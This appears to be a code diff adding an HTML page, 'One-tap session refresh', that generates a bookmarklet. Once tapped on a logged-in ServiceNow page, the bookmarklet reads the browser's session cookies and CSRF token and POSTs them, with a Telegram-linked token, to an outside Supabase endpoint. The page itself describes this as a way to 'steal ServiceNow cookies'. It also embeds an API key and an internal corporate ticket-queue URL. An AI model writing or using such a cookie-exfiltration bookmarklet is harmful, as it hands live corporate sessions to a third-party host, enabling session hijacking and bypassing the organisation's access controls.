@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+  <title>One-tap session refresh</title>
+  <style>
+    body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;margin:0;padding:20px;background:#0f172a;color:#e2e8f0;line-height:1.5}
+    h1{font-size:1.3rem}
+    .card{background:#1e293b;border-radius:12px;padding:16px;margin:16px 0}
+    a.btn{display:block;width:100%;text-align:center;background:#7c3aed;color:#fff;text-decoration:none;padding:16px;border-radius:10px;font-weight:700;margin:12px 0}
+    a.blue{background:#2563eb}
+    .warn{color:#fbbf24}.ok{color:#4ade80}
+    small{color:#94a3b8}
+  </style>
+</head>
+<body>
+  <h1>One-tap session refresh</h1>
+  <p>Browsers will not let a normal link steal ServiceNow cookies. This is the one-tap that <em>does</em> work: a bookmark you tap while logged into ServiceNow.</p>
+
+  <div class="card">
+    <p><strong>Once:</strong> drag this button to your bookmarks bar (or Add Bookmark).</p>
+    <a class="btn" id="bm" href="#">📌 Capture ServiceNow session</a>
+    <p id="status" class="warn"></p>
+  </div>
+
+  <div class="card">
+    <p><strong>When session dies:</strong> open ServiceNow (logged in) → tap that bookmark → ✅ on Telegram.</p>
+    <a class="btn blue" id="snow" href="#">Open ServiceNow queue</a>
+  </div>
+
+  <script>
+    const ANON = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFoa2VpcnJoamp0ZHl2cmRrYnhuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzY4MjY0MjEsImV4cCI6MjA5MjQwMjQyMX0.vgHg7uMrhaZ2YwKhmBKxrgmHzm83Ze3gD3XapXpGACc';
+    const RPC = 'https://qhkeirrhjjtdyvrdkbxn.supabase.co/rest/v1/rpc/upload_session_with_token';
+    const SNOW = 'https://micron.service-now.com/now/nav/ui/classic/params/target/sn_si_incident_list.do%3Fsysparm_query%3Dactive%253Dtrue%255Eassignment_groupDYNAMICd6435e965f510100a9ad2572f2b47744%26sysparm_first_row%3D1%26sysparm_view%3D';
+    const t = new URLSearchParams(location.search).get('t') || '';
+    document.getElementById('snow').href = SNOW;
+    const st = document.getElementById('status');
+    if (!t) {
+      st.textContent = 'Open this from the Telegram link so the token is included.';
+    } else {
+      const js = 'javascript:(async()=>{var T="' + t + '",U="' + RPC + '",K="' + ANON + '",S="' + SNOW + '";if(!/service-now\\.com$/.test(location.hostname)){location=S;return;}var c=document.cookie;if(c.indexOf("JSESSIONID=")<0){alert("Login to ServiceNow first, then tap the bookmark again");return;}var r=await fetch(U,{method:"POST",headers:{"Content-Type":"application/json",apikey:K,Authorization:"Bearer "+K},body:JSON.stringify({p_token:T,p_cookie:c,p_g_ck:window.g_ck||""})});var d=await r.json();alert(d.ok?"Session sent. Check Telegram.":(d.error||"Failed"));})();';
+      document.getElementById('bm').href = js;
+      st.textContent = 'Token loaded. Save the purple button as a bookmark.';
+      st.className = 'ok';
+    }
+  </script>
+</body>
+</html>
